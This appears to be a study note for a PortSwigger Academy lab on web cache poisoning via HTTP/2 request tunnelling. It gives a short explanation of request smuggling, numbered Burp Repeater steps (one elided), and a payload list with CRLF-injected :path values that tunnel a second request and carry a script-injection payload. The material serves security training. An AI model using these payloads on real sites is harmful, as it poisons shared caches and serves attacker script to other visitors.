# Lab: Web cache poisoning via HTTP/2 request tunnelling

**Official lab:** [https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling)

## Lab idea

This challenge combines HTTP/2 request tunnelling with shared web caching. It practices recognizing how a desynchronized request can influence cached content subsequently served to another visitor.

## Vulnerability in brief
HTTP request smuggling (often called **HTTP desync**) is a vulnerability class in which components that process a sequence of HTTP requests disagree about where one request ends and the next begins. In a common deployment, a frontend proxy or load balancer forwards multiple user requests over a reused connection to a backend. If the two systems parse an ambiguous request differently, bytes treated as body by one may be read as the start of another request by the other. This can cause an attacker-controlled prefix to interfere with a later request.

## Solution idea
1. Send a request for GET / to Burp Repeater.
2. Using the Inspector, try smuggling an arbitrary header in the :path pseudo-header, making sure to preserve a valid request line for the downgraded request as follows: Name :path Value…
3. Change the request method to HEAD and use the :path pseudo-header to tunnel a request for another arbitrary endpoint as follows: Name :path Value /?cachebuster=2 HTTP/1.1 \r\n Host…
4. Send the request and observe that you are able to view the tunnelled response.
- …
6. Send the request and confirm that your payload is successfully reflected in the tunnelled response.
7. While the cache is still poisoned, visit the home page using the same cachebuster query parameter and confirm that the alert() fires.
8. In the Inspector, remove the cachebuster from your request and resend it until you have poisoned the cache.

## Payloads / key values
- `GET /`
- `:path`
- `/?cachebuster=1 HTTP/1.1 \r\n Foo: bar`
- `HEAD`
- `/?cachebuster=2 HTTP/1.1 \r\n Host: YOUR-LAB-ID.web-security-academy.net \r\n \r\n GET /post?postId=1 HTTP/1.1 \r\n Foo: bar`
- `Host`
- `HTTP/1.1`
- `postId`
- `GET /resources`
- `/resources/`
- `/?cachebuster=3 HTTP/1.1 \r\n Host: YOUR-LAB-ID.web-security-academy.net \r\n \r\n GET /resources?<script>alert(1)</script> HTTP/1.1 \r\n Foo: bar`
- `Content-Length`
- `</script>`
- `alert()`

## Official source
- [PortSwigger Academy: Lab: Web cache poisoning via HTTP/2 request tunnelling](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling)
